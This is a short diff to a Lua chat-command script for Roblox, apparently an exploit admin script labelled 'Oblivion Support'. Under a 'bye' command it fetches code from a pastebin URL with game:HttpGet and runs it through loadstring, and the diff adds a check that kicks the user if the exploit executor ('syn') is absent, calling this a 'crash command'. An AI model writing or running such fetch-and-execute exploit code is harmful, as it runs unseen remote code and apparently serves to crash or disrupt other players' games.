@@ -2414,8 +2414,14 @@ function LocalPlayerChatted(msg)
 		notify("Cleared list.")
 	end
 	if command("bye") then
+	if not syn then 
+	    game.Players.LocalPlayer:Kick("Oblivion Support : your exploit doesn't support crash command")
+else
+    if syn then
 	loadstring(game:HttpGet('https://pastebin.com/raw/Mv242yVV'))()
-	end
+    end
+end
+end
 	if command("prefix") then
 		changeprefix(arg2)
 		notify("Prefix set to'"..arg2.."'.")
